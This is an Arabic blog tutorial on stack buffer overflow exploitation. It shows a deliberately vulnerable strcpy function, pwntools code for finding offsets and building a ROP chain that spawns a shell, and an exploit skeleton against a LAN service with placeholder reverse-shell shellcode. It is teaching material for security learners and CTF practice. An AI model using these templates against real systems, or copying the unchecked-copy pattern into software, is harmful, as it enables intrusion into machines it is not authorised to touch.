---
layout: blog
title: "Buffer Overflow من الأساس للاستغلال: فهم الثغرة التي غيّرت مشهد الأمن السيبراني"
date: 2026-03-29T16:13:16Z
category: "تقنية"
excerpt: "ثغرة Buffer Overflow ليست مجرد خلل برمجي، بل هي البوابة التي فتحت عالم استغلال الثغرات الحديث. في هذه المقالة، نغوص في تشريح الثغرة من المستوى المنخفض للذاكرة حتى كتابة exploit عملي. رحلة تقنية من الصفر إلى السيطرة الكاملة على تدفق البرنامج."
read_time: 12
tags: ["Buffer Overflow", "Exploit Development", "Memory Corruption", "Binary Exploitation", "Offensive Security"]
slug: "buffer-overflow-guide"
---

## الذاكرة وبنية Stack: حيث تبدأ القصة

لفهم Buffer Overflow، عليك أولاً فهم كيف يدير البرنامج الذاكرة. عندما تستدعي دالة في برنامجك، يُنشئ النظام stack frame جديد يحتوي على:

- المتغيرات المحلية (local variables)
- عنوان العودة (return address) - العنوان الذي سيعود إليه البرنامج بعد انتهاء الدالة
- مؤشر الـ base pointer السابق (saved EBP/RBP)

الـ stack ينمو نحو العناوين المنخفضة، بينما البيانات داخل buffer تُكتب نحو العناوين الأعلى. هذا التصادم هو جوهر الثغرة.

```c
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // لا يوجد فحص للحجم!
}
```

عندما يتجاوز `input` حجم 64 بايت، يبدأ في الكتابة فوق saved EBP ثم return address. السيطرة على return address تعني السيطرة على مسار تنفيذ البرنامج.

## تشريح الاستغلال: من النظرية للتطبيق

الخطوة الأولى هي إيجاد الـ offset الصحيح - كم بايت تحتاج قبل الوصول لـ return address؟

```python
from pwn import *

# إنشاء pattern فريد
pattern = cyclic(200)
print(pattern)
```

بعد crash البرنامج، تفحص قيمة instruction pointer (EIP/RIP). باستخدام `cyclic_find()`، تحدد المسافة بالضبط.

```python
# لو crash عند 0x61616173
offset = cyclic_find(0x61616173)  # مثلاً: 72 بايت
```

الآن تبني exploit بنية:
```
[PADDING] + [RETURN_ADDRESS] + [SHELLCODE/ROP]
```

## Protection Mechanisms: العقبات الحديثة

الأنظمة الحديثة ليست ساذجة. ستواجه:

**ASLR (Address Space Layout Randomization)**: يُعشوئ عناوين الذاكرة في كل تشغيل. الحل؟ memory leak أو ROP مع relative addressing.

**DEP/NX (Data Execution Prevention)**: يمنع تنفيذ الكود من الـ stack. الحل؟ Return-Oriented Programming (ROP).

**Stack Canary**: قيمة عشوائية قبل return address. إذا تغيرت، البرنامج ينهار. الحل؟ leak القيمة أو تجنّبها.

```bash
# فحص الحمايات
checksec ./vulnerable_binary
```

## ROP: الاستغلال عندما يُغلق الباب الرئيسي

عندما لا تستطيع تنفيذ shellcode مباشرة، تبحث عن ROP gadgets - تعليمات موجودة مسبقاً في البرنامج تنتهي بـ `ret`.

```python
from pwn import *

elf = ELF('./vulnerable')
rop = ROP(elf)

# مثال: استدعاء system("/bin/sh")
rop.call('system', [next(elf.search(b'/bin/sh'))])

payload = b'A' * offset
payload += rop.chain()
```

تربط هذه الـ gadgets لبناء chain يُنفذ ما تريد: تحضير registers، استدعاء system calls، تنفيذ shell.

## من المختبر للواقع: سيناريوهات عملية

في penetration testing، Buffer Overflow يظهر في:

**1. تطبيقات الشبكة القديمة**: خوادم FTP، web servers قديمة، بروتوكولات proprietary.

**2. IoT devices**: firmware بدون حمايات حديثة، غالباً على ARM architecture.

**3. برامج Windows قديمة**: خصوصاً تلك المكتوبة بـ C/C++ قبل عصر SDL.

مثال عملي على استغلال خدمة شبكة:

```python
from pwn import *

host = '192.168.1.100'
port = 9999

conn = remote(host, port)

# بناء payload
buffer = b'A' * 2003
eip = p32(0xDEADBEEF)  # عنوان الـ JMP ESP
nops = b'\x90' * 16
shellcode = b'\x31\xc0\x50...'  # reverse shell

payload = buffer + eip + nops + shellcode

conn.send(payload)
conn.interactive()
```

## الخلاصة: من الفهم للإتقان

Buffer Overflow هي أكثر من ثغرة - هي مدخلك لفهم memory corruption بشكل عام. من هنا تتفرع Use-After-Free، Heap Overflow، Format String، وغيرها.

المفتاح هو الممارسة المستمرة. ابدأ ببرامج بسيطة بدون حمايات، ثم تدرّج لـ CTF challenges مع ASLR وDEP. استخدم منصات مثل:

- HackTheBox
- pwnable.kr  
- Exploit Education (Phoenix)

تذكّر: الهدف ليس الاستغلال فقط، بل فهم لماذا نجح، وكيف يمكن منعه. هذا الفهم العميق هو ما يميّز security researcher محترف عن script kiddie.
